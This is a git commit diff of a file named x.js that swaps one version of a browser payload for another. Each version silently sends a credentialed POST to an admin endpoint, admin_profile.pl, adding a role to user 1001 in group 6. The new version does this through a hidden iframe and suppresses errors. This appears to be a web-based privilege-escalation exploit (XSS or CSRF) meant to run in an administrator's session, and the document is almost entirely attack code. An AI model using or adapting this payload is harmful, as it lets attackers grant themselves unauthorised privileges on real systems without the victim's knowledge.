d9439d3b2b8e0d33a512d33ce6eb5e9258c2b8b1
BoxBoxShell <127796580+BoxBoxShell@users.noreply.github.com>
2025-05-06 14:24:02 +0000

    Update x.js

--- x.js
+++ x.js
@@ -1,19 +1,18 @@
-(() => {
-  const token = Date.now();
-  const data = 'pid=oslo_test&unique=' + token +
-    '&action=save_members&group_id=6' +
-    '&added_permissions=%7B%7D' +
-    '&removed_permissions=%7B%7D' +
-    '&added_roles=' + encodeURIComponent('{"1001":{"93940":1}}') +
-    '&removed_roles=%7B%7D&su=';
-
-  fetch('/cgi-bin/admin/person/admin_profile.pl', {
-    method: 'POST',
-    credentials: 'include',
-    headers: {
-      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-      'X-Requested-With': 'XMLHttpRequest'
-    },
-    body: data
-  });
-})();
+const f = document.createElement('iframe');
+f.hidden = true;
+f.src = '/cgi-bin/admin/person/admin_profile.pl?pid=oslo_test&action=groupmembers&GroupID=6';
+document.body.appendChild(f);
+f.onload = () => {
+  try {
+    f.contentWindow.fetch('/cgi-bin/admin/person/admin_profile.pl', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Accept': 'application/json'
+      },
+      body: 'pid=oslo_test&action=save_members&group_id=6&added_roles=%7B%221001%22%3A%7B%2293940%22%3A1%7D%7D'
+    });
+  } catch (e) {}
+};
